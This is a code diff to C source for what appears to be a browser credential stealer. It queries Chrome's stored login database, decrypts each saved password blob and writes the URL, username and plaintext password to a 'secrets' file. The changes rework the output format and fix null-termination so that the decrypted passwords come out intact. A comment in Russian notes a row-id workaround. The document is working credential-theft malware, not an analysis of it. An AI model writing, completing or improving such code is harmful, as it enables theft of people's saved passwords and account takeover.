@@ -50,7 +50,7 @@ int main(void)
 				goto out;
 		}
 
-		fputs("ORIGIN_URL\t\tUSERNAME_VALUE\t\tPASSWORD_VALUE\n",file_with_secrets);
+		
 		
 		result = sqlite3_exec(logindata_database,USER_DATA_QUERY,process_row, logindata_database, &err_msg);
         if (result!=SQLITE_OK) 
@@ -84,15 +84,11 @@ static int process_row(void *passed_db, int argc, char **argv, char **col_name)
 		sqlite3_blob *blob = NULL;
 		sqlite3 *db = (sqlite3*)passed_db;
 		BYTE *blob_data = NULL;
-		char *array;
+		unsigned char *array,*tmp_array;
 		int result;
-		int blob_size = 0;
+		int blob_size=0;
 		int i;
 
-		fputs(argv[0],file_with_secrets);
-		fputs("\t\t",file_with_secrets);
-		fputs(argv[1],file_with_secrets);
-		fputs("\t\t",file_with_secrets);
 		
 		if (row_id==3)
 				row_id++;/* TODO reinstall chrome | какая-то хуйня с row id случилась, потому и костыль*/
@@ -106,7 +102,7 @@ static int process_row(void *passed_db, int argc, char **argv, char **col_name)
 		row_id++;
 		
 		blob_size = sqlite3_blob_bytes(blob);
-		blob_data = malloc(blob_size);
+		blob_data = (BYTE*)malloc(blob_size);
 		
 		result = sqlite3_blob_read(blob, blob_data, blob_size, 0);
 		if (result!=SQLITE_OK) {
@@ -122,26 +118,26 @@ static int process_row(void *passed_db, int argc, char **argv, char **col_name)
 				return 0;
 		}
 		
-		array = malloc(decrypted_password.cbData);
-		//strncpy(array,(char*)decrypted_password.pbData,decrypted_password.cbData);
-		memcpy(array,(char*)decrypted_password.pbData,decrypted_password.cbData);
+		array = (unsigned char*)malloc(decrypted_password.cbData+1);
+		memset(array,0,decrypted_password.cbData);
 		
+		for(i=0;i<decrypted_password.cbData;i++)
+				array[i]=(unsigned char)decrypted_password.pbData[i];
+		array[i] = '\0';
+
+		fputs("URL: ",file_with_secrets);
+		fputs(argv[0],file_with_secrets);
+		fputs("\nLOGIN: ",file_with_secrets);
+		fputs(argv[1],file_with_secrets);
+		fputs("\nPASWWORD: ",file_with_secrets);
 		fputs(array,file_with_secrets);
-		fputs("\n",file_with_secrets);
-		/*
-		for (i = 0; i<decrypted_password.cbData;i++) {
-        if(!array[i]){
-            continue;
-        }
-		fputs(array[i],file_with_secrets);
-		}         
-		fputs("\n",file_with_secrets);
-		*/
+		fputs("\n\n",file_with_secrets);
+		
+		free(array);
 		LocalFree(decrypted_password.pbData);
 		free(blob_data);
 		sqlite3_blob_close(blob);
 		sqlite3_close(db);
-                
-        return 0;
+		return 0;
 }
 
